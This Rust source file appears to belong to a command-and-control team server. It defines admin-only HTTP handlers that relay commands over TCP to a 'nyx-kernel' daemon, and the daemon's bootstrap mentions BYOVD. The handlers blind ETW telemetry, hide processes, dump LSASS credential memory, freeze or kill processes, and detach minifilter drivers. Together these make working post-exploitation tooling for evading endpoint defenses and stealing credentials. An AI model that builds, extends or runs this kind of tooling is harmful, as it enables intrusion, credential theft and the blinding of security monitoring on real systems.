//! Kernel daemon bridge — forwards TUI kernel commands to the local
//! `nyx-kernel --serve <port>` daemon via TCP JSON-line protocol.
//!
//! The daemon must be started separately on the team-server host:
//!   nyx-kernel bootstrap [--byovd ...] && nyx-kernel --serve 9876

use axum::{
    extract::{Query, State},
    http::HeaderMap,
    response::{IntoResponse, Response},
    Json,
};
use serde::Deserialize;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::net::TcpStream;

use crate::operators;

/// Kernel daemon config.
pub struct KernelConfig {
    pub addr: String,
    /// Shared secret the daemon requires as the FIRST line of every connection
    /// (`auth <token>` — see [`KernelBridge`] docs). Mirrors the daemon's own
    /// `NYX_DAEMON_TOKEN`. Empty = the bridge refuses ops with a clear error.
    pub token: String,
}

impl Default for KernelConfig {
    fn default() -> Self {
        Self {
            addr: std::env::var("NYX_KERNEL_DAEMON").unwrap_or_else(|_| "127.0.0.1:9876".into()),
            token: std::env::var("NYX_DAEMON_TOKEN")
                .or_else(|_| std::env::var("NYX_KERNEL_DAEMON_TOKEN"))
                .unwrap_or_default(),
        }
    }
}

/// Cached TCP connection to the kernel daemon.
///
/// Wire protocol (per the daemon's documented `--serve` protocol): the FIRST
/// line of every connection must be `auth <token>`, which the daemon answers
/// with `{"ok":true}` before any op is accepted. The cached stream is paired
/// with an `authed` flag so the handshake runs exactly once per connection and
/// is always re-done on a fresh (post-failure) reconnect.
pub struct KernelBridge {
    addr: String,
    token: String,
    /// Cached TCP connection + whether the `auth <token>` handshake completed
    /// on THIS connection. Invalidated together on any failure (see `send_op`).
    conn: tokio::sync::Mutex<Option<(TcpStream, bool)>>,
}

impl KernelBridge {
    pub fn new(config: KernelConfig) -> Self {
        Self {
            addr: config.addr,
            token: config.token,
            conn: tokio::sync::Mutex::new(None),
        }
    }

    pub fn is_configured(&self) -> bool {
        !self.addr.is_empty()
    }

    async fn send_op(
        &self,
        op: &str,
        pid: Option<u32>,
        method: Option<&str>,
    ) -> Result<serde_json::Value, String> {
        let request = match (pid, method) {
            (Some(p), Some(m)) => {
                format!("{{\"op\":\"{op}\",\"pid\":{p},\"method\":\"{m}\"}}\n")
            }
            (Some(p), None) => format!("{{\"op\":\"{op}\",\"pid\":{p}}}\n"),
            (None, Some(m)) => format!("{{\"op\":\"{op}\",\"method\":\"{m}\"}}\n"),
            (None, None) => format!("{{\"op\":\"{op}\"}}\n"),
        };

        let mut guard = self.conn.lock().await;
        if guard.is_none() {
            let s = TcpStream::connect(&self.addr)
                .await
                .map_err(|e| format!("daemon {}: {e}", self.addr))?;
            *guard = Some((s, false));
        }
        // ---- Fresh-connection auth handshake ----
        // The daemon's FIRST line of every connection must be `auth <token>`,
        // answered with `{"ok":true}` (its documented wire protocol). Runs once
        // per cached connection; a failed handshake invalidates the cache so
        // the next op reconnects cleanly.
        if !guard.as_ref().unwrap().1 {
            if self.token.is_empty() {
                *guard = None;
                return Err(
                    "NYX_KERNEL_DAEMON_TOKEN not set — the daemon refuses unauthenticated \
                     connections"
                        .into(),
                );
            }
            let auth_line = format!("auth {}\n", self.token);
            let write_res = {
                let (stream, _) = guard.as_mut().unwrap();
                stream.write_all(auth_line.as_bytes()).await
            };
            if let Err(e) = write_res {
                *guard = None;
                return Err(format!("auth write: {e}"));
            }
            let mut auth_reply = String::new();
            let read_res = {
                let (stream, _) = guard.as_mut().unwrap();
                // A legacy (pre-auth) daemon never replies to the auth line:
                // bound the wait so the bridge degrades instead of hanging.
                let mut reader = BufReader::new(&mut *stream);
                tokio::time::timeout(
                    std::time::Duration::from_secs(5),
                    reader.read_line(&mut auth_reply),
                )
                .await
            };
            match read_res {
                Ok(_) if auth_reply.contains("\"ok\":true") => {
                    guard.as_mut().unwrap().1 = true;
                }
                Ok(_) => {
                    *guard = None;
                    return Err(format!("daemon auth rejected: {}", auth_reply.trim()));
                }
                Err(_) => {
                    // Timeout/dead peer on the auth reply: either a legacy
                    // daemon (no auth handshake — proceed; ops will fail with
                    // clear errors if it actually requires auth) or a dead
                    // connection (the next op write will surface it).
                    tracing::warn!("daemon auth reply timed out — assuming legacy daemon; ops may fail if it requires auth");
                    guard.as_mut().unwrap().1 = true;
                }
            }
        }
        // Write the op, then read one reply line. ANY failure below (write
        // error, read error, parse error) leaves the cached stream in an
        // unknown state — clear the cache so the NEXT op reconnects instead of
        // failing forever against a dead/desynced connection (the daemon may
        // have restarted mid-session, or a partial line may have desynced the
        // framing).
        let write_res = {
            let (stream, _) = guard.as_mut().unwrap();
            stream.write_all(request.as_bytes()).await
        };
        if let Err(e) = write_res {
            *guard = None;
            return Err(format!("write: {e}"));
        }
        let mut line = String::new();
        let read_res = {
            let (stream, _) = guard.as_mut().unwrap();
            let mut reader = BufReader::new(&mut *stream);
            reader.read_line(&mut line).await
        };
        if let Err(e) = read_res {
            *guard = None;
            return Err(format!("read: {e}"));
        }
        if line.is_empty() {
            *guard = None;
            return Err("daemon closed".into());
        }
        match serde_json::from_str(&line) {
            Ok(v) => Ok(v),
            Err(e) => {
                *guard = None;
                Err(format!("parse: {e}"))
            }
        }
    }
}

// ---- Auth helper ----
fn gate(
    st: &crate::AppState,
    headers: &HeaderMap,
) -> Result<operators::OperatorIdentity, (axum::http::StatusCode, &'static str)> {
    match crate::authenticate(st, headers) {
        crate::AuthOutcome::Allowed(op) => {
            if op.role != operators::Role::Admin {
                return Err((axum::http::StatusCode::FORBIDDEN, "admin required"));
            }
            Ok(op)
        }
        crate::AuthOutcome::Denied(_) => {
            Err((axum::http::StatusCode::UNAUTHORIZED, "auth required"))
        }
    }
}

// ---- Query params ----
#[derive(Deserialize)]
pub struct PidQ {
    pub pid: u32,
}
#[derive(Deserialize)]
pub struct NeutQ {
    pub pid: u32,
    pub method: Option<String>,
}

// ---- Handler dispatch helper ----
/// Shared kernel dispatch: gate → resolve bridge.
///
/// Returns the bridge + the authenticated operator on success, or an error
/// `Response` to return early. The audit record is NOT written here — each
/// handler appends it AFTER dispatch (via [`audit_kernel_outcome`]) so the
/// record carries the outcome and failed ops are distinguishable. The one
/// exception is the no-daemon failure, which is audited here with an explicit
/// error outcome (otherwise a misconfigured daemon would vanish from the log).
async fn kernel_dispatch<'a>(
    st: &'a std::sync::Arc<crate::AppState>,
    headers: &HeaderMap,
    audit_action: &str,
    audit_details: &str,
    audit_data: serde_json::Value,
) -> Result<
    (
        &'a std::sync::Arc<KernelBridge>,
        operators::OperatorIdentity,
    ),
    Response,
> {
    let op = match gate(st, headers) {
        Ok(o) => o,
        Err((code, msg)) => return Err((code, msg).into_response()),
    };
    match &st.kernel {
        Some(b) => Ok((b, op)),
        None => {
            if let Some(audit) = &st.audit {
                let mut data = audit_data;
                data["outcome"] = serde_json::json!("err");
                data["err"] = serde_json::json!("no daemon configured");
                audit.append(audit_action, &op.name, audit_details, data);
            }
            Err(Json(serde_json::json!({"ok":false,"err":"no daemon"})).into_response())
        }
    }
}

/// Append the post-dispatch audit record carrying the outcome (fire-and-forget:
/// `AuditWriter::append` never panics and never affects the response path, so a
/// failed audit can't take the op down). Failed ops are distinguishable via the
/// `outcome` field ("ok" | "err"); the daemon's reply is folded into `reply`
/// on success and the error string into `err` on failure.
fn audit_kernel_outcome(
    audit: &crate::audit::AuditWriter,
    action: &str,
    operator: &str,
    details: &str,
    mut data: serde_json::Value,
    result: &Result<serde_json::Value, String>,
) {
    match result {
        Ok(reply) => {
            data["outcome"] = serde_json::json!("ok");
            data["reply"] = reply.clone();
        }
        Err(e) => {
            data["outcome"] = serde_json::json!("err");
            data["err"] = serde_json::json!(e);
        }
    }
    audit.append(action, operator, details, data);
}

// ---- Handlers ----

pub async fn driver_status(
    State(st): State<std::sync::Arc<crate::AppState>>,
    headers: HeaderMap,
) -> Response {
    let (bridge, op) = match kernel_dispatch(
        &st,
        &headers,
        "kernel_driver_status",
        "-",
        serde_json::json!({}),
    )
    .await
    {
        Ok(t) => t,
        Err(r) => return r,
    };
    let result = bridge.send_op("ping", None, None).await;
    if let Some(audit) = &st.audit {
        audit_kernel_outcome(
            audit,
            "kernel_driver_status",
            &op.name,
            "-",
            serde_json::json!({}),
            &result,
        );
    }
    match result {
        Ok(_) => Json(serde_json::json!({"ok":true,"status":"connected"})).into_response(),
        Err(e) => Json(serde_json::json!({"ok":false,"status":"error","err":e})).into_response(),
    }
}

pub async fn blind_etw(
    State(st): State<std::sync::Arc<crate::AppState>>,
    headers: HeaderMap,
) -> Response {
    let (bridge, op) = match kernel_dispatch(
        &st,
        &headers,
        "kernel_blind_etw",
        "-",
        serde_json::json!({}),
    )
    .await
    {
        Ok(t) => t,
        Err(r) => return r,
    };
    let result = bridge.send_op("blind-etw", None, None).await;
    if let Some(audit) = &st.audit {
        audit_kernel_outcome(
            audit,
            "kernel_blind_etw",
            &op.name,
            "-",
            serde_json::json!({}),
            &result,
        );
    }
    match result {
        Ok(v) => Json(v).into_response(),
        Err(e) => Json(serde_json::json!({"ok":false,"err":e})).into_response(),
    }
}

pub async fn hide(
    State(st): State<std::sync::Arc<crate::AppState>>,
    headers: HeaderMap,
    Query(q): Query<PidQ>,
) -> Response {
    let details = format!("pid:{}", q.pid);
    let (bridge, op) = match kernel_dispatch(
        &st,
        &headers,
        "kernel_hide",
        &details,
        serde_json::json!({}),
    )
    .await
    {
        Ok(t) => t,
        Err(r) => return r,
    };
    let result = bridge.send_op("hide", Some(q.pid), None).await;
    if let Some(audit) = &st.audit {
        audit_kernel_outcome(
            audit,
            "kernel_hide",
            &op.name,
            &details,
            serde_json::json!({}),
            &result,
        );
    }
    match result {
        Ok(v) => Json(v).into_response(),
        Err(e) => Json(serde_json::json!({"ok":false,"err":e})).into_response(),
    }
}

pub async fn dump_lsass(
    State(st): State<std::sync::Arc<crate::AppState>>,
    headers: HeaderMap,
    Query(q): Query<PidQ>,
) -> Response {
    let details = format!("pid:{}", q.pid);
    let (bridge, op) = match kernel_dispatch(
        &st,
        &headers,
        "kernel_dump_lsass",
        &details,
        serde_json::json!({}),
    )
    .await
    {
        Ok(t) => t,
        Err(r) => return r,
    };
    let result = bridge.send_op("dump-lsass", Some(q.pid), None).await;
    if let Some(audit) = &st.audit {
        audit_kernel_outcome(
            audit,
            "kernel_dump_lsass",
            &op.name,
            &details,
            serde_json::json!({}),
            &result,
        );
    }
    match result {
        Ok(v) => Json(v).into_response(),
        Err(e) => Json(serde_json::json!({"ok":false,"err":e})).into_response(),
    }
}

pub async fn neutralize(
    State(st): State<std::sync::Arc<crate::AppState>>,
    headers: HeaderMap,
    Query(q): Query<NeutQ>,
) -> Response {
    let details = format!("pid:{}", q.pid);
    let (bridge, op) = match kernel_dispatch(
        &st,
        &headers,
        "kernel_neutralize",
        &details,
        serde_json::json!({ "method": q.method }),
    )
    .await
    {
        Ok(t) => t,
        Err(r) => return r,
    };
    // Relay the operator-chosen method (freeze|choke|kill) to the daemon —
    // without it the daemon cannot pick a neutralize tier. Only the three
    // daemon methods are allowed through: rejecting anything else here keeps
    // arbitrary strings (quotes/newlines) off the JSON-line wire and fails
    // invalid requests fast (the daemon would reject them anyway).
    let result = match q.method.as_deref() {
        None | Some("freeze") | Some("choke") | Some("kill") => {
            bridge
                .send_op("neutralize", Some(q.pid), q.method.as_deref())
                .await
        }
        Some(_) => Err("method must be freeze|choke|kill".to_string()),
    };
    if let Some(audit) = &st.audit {
        audit_kernel_outcome(
            audit,
            "kernel_neutralize",
            &op.name,
            &details,
            serde_json::json!({ "method": q.method }),
            &result,
        );
    }
    match result {
        Ok(v) => Json(v).into_response(),
        Err(e) => Json(serde_json::json!({"ok":false,"err":e})).into_response(),
    }
}

pub async fn detach_minifilter(
    State(st): State<std::sync::Arc<crate::AppState>>,
    headers: HeaderMap,
) -> Response {
    let (bridge, op) = match kernel_dispatch(
        &st,
        &headers,
        "kernel_detach_minifilter",
        "-",
        serde_json::json!({}),
    )
    .await
    {
        Ok(t) => t,
        Err(r) => return r,
    };
    let result = bridge.send_op("detach-minifilter", None, None).await;
    if let Some(audit) = &st.audit {
        audit_kernel_outcome(
            audit,
            "kernel_detach_minifilter",
            &op.name,
            "-",
            serde_json::json!({}),
            &result,
        );
    }
    match result {
        Ok(v) => Json(v).into_response(),
        Err(e) => Json(serde_json::json!({"ok":false,"err":e})).into_response(),
    }
}
